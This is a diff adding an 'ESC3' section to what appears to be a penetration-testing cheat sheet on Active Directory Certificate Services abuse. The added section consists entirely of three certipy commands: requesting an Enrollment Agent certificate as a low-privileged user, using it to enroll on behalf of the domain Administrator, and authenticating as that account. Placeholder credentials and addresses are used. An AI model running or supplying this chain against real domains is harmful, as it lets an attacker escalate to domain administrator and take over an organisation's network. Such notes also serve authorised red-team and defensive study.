@@ -35,3 +35,22 @@
     certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'  
     ```
 
+### ESC3 (Very similar to ESC2 in exploitation)
+#### Exploitation
+- Linux
+    ```bash
+    certipy req \
+        -u 'attacker@corp.local' -p 'Passw0rd!' \
+        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
+        -ca 'CORP-CA' -template 'EnrollAgent'
+    ```
+    ```bash 
+    certipy req \
+        -u 'attacker@corp.local' -p 'Passw0rd!' \
+        -dc-ip '10.0.0.100' -target 'CA.CORP.LOCAL' \
+        -ca 'CORP-CA' -template 'User' \
+        -pfx 'attacker.pfx' -on-behalf-of 'CORP\Administrator'
+    ```
+    ```bash    
+    certipy auth -pfx 'administrator.pfx' -dc-ip '10.0.0.100'
+    ```
